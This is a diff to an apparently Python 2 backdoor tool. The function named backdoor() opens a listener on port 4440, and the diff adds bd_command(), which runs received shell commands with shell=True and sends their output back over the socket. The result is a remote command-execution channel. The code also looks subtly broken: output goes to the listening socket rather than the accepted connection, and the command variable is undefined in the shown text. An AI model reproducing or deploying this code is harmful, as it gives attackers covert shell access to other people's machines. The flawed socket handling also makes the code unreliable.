@@ -27,6 +27,11 @@ def command():
     output = cmd.stdout.read() + cmd.stderr.read()
     s.send(output)
 
+def bd_command():
+    cmd = subprocess.Popen(srv_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    output = cmd.stdout.read() + cmd.stderr.read()
+    bds.send(output)
+
 # Upload File
 def send_file():
     try:
@@ -58,6 +63,7 @@ def recover_file():
 
 # Create
 def backdoor():
+    global bds
     global bd_port
     bd_host = ''
     bd_port = 4440
@@ -72,6 +78,7 @@ def backdoor():
     print "Backdoor opened: Listening on port: ", bd_port
     bdcon, bdaddr = bds.accept()
     print "Server connected: ", bdaddr
+    bd_command()
 
 
 def main():
